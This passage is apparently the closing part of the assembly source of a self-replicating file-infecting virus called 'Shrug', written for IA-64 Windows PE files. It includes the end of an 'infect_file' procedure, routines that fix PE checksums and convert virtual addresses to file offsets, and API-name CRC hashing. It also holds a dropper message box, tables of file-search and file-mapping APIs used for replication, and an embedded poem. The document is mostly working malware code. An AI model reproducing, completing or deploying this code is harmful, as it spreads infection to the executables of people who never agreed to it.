        st8                     [loc10] = loc13
        add                     loc13 = shrug_tlscode2 - tlsdata - tlsfuncind, loc13
        br.call.sptk.few        rp = rva2raw
        ld4                     loc9 = [out2]
        add                     ret0 = ret0, loc2
        add                     loc9 = loc9, loc8
        st8                     [ret0] = loc13, 8
        st8                     [ret0] = loc9

//-----------------------------------------------------------------------------
//CheckSumMappedFile() - simply sum of all words in file, then adc filesize
//-----------------------------------------------------------------------------

checksum_file:
        st1                     [loc6] = loc7
        add                     loc5 = pechksum, loc5
        mov                     loc6 = 0
        xchg4                   loc7 = [loc5], loc6
        cmp.ne                  p1 = 0, loc7
(p1)    add                     loc8 = 1, ret3
(p1)    shr.u                   loc8 = loc8, 1

calc_checksum:
(p1)    ld2                     loc9 = [loc2], 2
(p1)    add                     loc8 = -1, loc8
(p1)    add                     loc6 = loc9, loc6
(p1)    cmp.ne.unc              p1, p2 = 0, loc8
(p1)    br.cond.sptk.few        calc_checksum
(p2)    shr.u                   loc7 = loc6, 16
(p2)    extr.u                  loc6 = loc6, 0, 16
(p2)    add                     loc7 = loc7, loc6
(p2)    extr.u                  loc6 = loc7, 0, 16
(p2)    extr.u                  loc7 = loc7, 16, 1      //avoid common bug.  ADC not ADD
(p2)    add                     loc6 = loc7, loc6
(p2)    add                     loc6 = loc6, ret3
(p2)    st4                     [loc5] = loc6

//-----------------------------------------------------------------------------
//exception must be in M slot, since continuation occurs from same slot,
//even if IP is moved to another location
//-----------------------------------------------------------------------------

.align 16
        ld1                     ret0 = [r0]
                                string          "*4U2NV*"
                                                        //that is, unless you're reading this
.align 16
.endp   infect_file

//-----------------------------------------------------------------------------
//convert relative virtual address to raw file offset
//-----------------------------------------------------------------------------

.proc   rva2raw
rva2raw:
        add                     r31 = sectvirtaddr - sectvirtsize, in0

rvaloop:
        ld4                     r30 = [r31], sectrawaddr - sectvirtaddr
        cmp.gtu                 p2, p3 = r30, in1
(p3)    sub                     ret0 = in1, r30
(p3)    ld4                     r29 = [r31]
(p2)    add                     r31 = -size_pesect + sectvirtaddr - sectrawaddr, r31
(p3)    add                     ret0 = r29, ret0
(p2)    br.cond.sptk.few        rvaloop
        br.ret.sptk.many        rp
.endp   rva2raw

.proc   call_api
call_api:
        ld8                     r2 = [r2]
        ld8                     r3 = [r2], 8
        ld8                     gp = [r2]
        mov                     b1 = r3
        br.few                  b1
.endp   call_api

        //When last comes to last,
        //  I have little power:
        //  I am merely an urn.
        //I hold the bone-sap of myself,
        //  And watch the marrow burn.
        //
        //When last comes to last,
        //  I have little strength:
        //  I am only a tool.
        //I work its work; and in its hands
        //  I am the shrugl.
        //
        //When last comes to last,
        //  I have little life.
        //  I am simply a deed:
        //an action done while courage holds:
        //  A seed.
        //(Stephen Donaldson)

.align 16
shrug_codeend:

.proc   create_crcs
create_crcs:
        alloc                   loc0 = 3, 5, 0, 0
        mov                     loc1 = rp
        ld8                     in1 = [in1]
        ld8                     in2 = [in2]
        movl                    loc2 = 0x4c11db7

create_loop:
        or                      loc3 = -1, r0

create_outer:
        ld1                     loc4 = [in1], 1
        xor                     loc3 = loc3, loc4
        mov                     ar.lc = 7

create_inner:
        tbit.nz                 p1 = loc3, 31
        shl                     loc3 = loc3, 1
(p1)    xor                     loc3 = loc3, loc2
        br.cloop.sptk.few       create_inner
        cmp.ne                  p1 = 0, loc4
(p1)    br.cond.sptk.few        create_outer
        st4                     [in2] = loc3, 4
        add                     in0 = -1, in0
        cmp.ne                  p1 = 0, in0
(p1)    br.cond.sptk.few        create_loop
        mov                     ar.pfs = loc0
        br.ret.sptk.many        rp
.endp   create_crcs

.proc   do_message
do_message:
        alloc                   loc0 = 0, 2, 4, 0
        add                     out1 = @ltoff(txtbody), gp
        add                     out2 = @ltoff(txttitle), gp
        ld8                     out1 = [out1]
        ld8                     out2 = [out2]
        mov                     out0 = 0
        mov                     loc1 = gp
        mov                     out3 = 0
        br.call.sptk.many       rp = MessageBoxA
        mov                     gp = loc1
        br.call.sptk.few        rp = ExitProcess
.endp   do_message

//must be alphabetical order
//API names are not present in replications, only in dropper

ntdnames:                       stringz         "LdrGetDllHandle"
                                stringz         "RtlAddVectoredExceptionHandler"
                                stringz         "RtlRemoveVectoredExceptionHandler"

krnnames:                       stringz         "CloseHandle"
                                stringz         "CreateFileMappingA"
                                stringz         "CreateFileW"
                                stringz         "FindClose"
                                stringz         "FindFirstFileW"
                                stringz         "FindNextFileW"
                                stringz         "GetFullPathNameW"
                                stringz         "GetTickCount"
                                stringz         "GlobalAlloc"
                                stringz         "GlobalFree"
                                stringz         "LoadLibraryA"
                                stringz         "MapViewOfFile"
                                stringz         "SetCurrentDirectoryA"
                                stringz         "SetCurrentDirectoryW"
                                stringz         "SetFileAttributesW"
                                stringz         "SetFileTime"
                                stringz         "UnmapViewOfFile"

sfcnames:                       stringz         "SfcIsFileProtected"

ntdll:                          stringz         "ntdll"

txttitle:                       stringz         "Shrug"
txtbody:                        stringz         "running..."

.global GetModuleHandleA
.type   GetModuleHandleA, @function
.global MessageBoxA
.type   MessageBoxA, @function
.global ExitProcess
.type   ExitProcess, @function
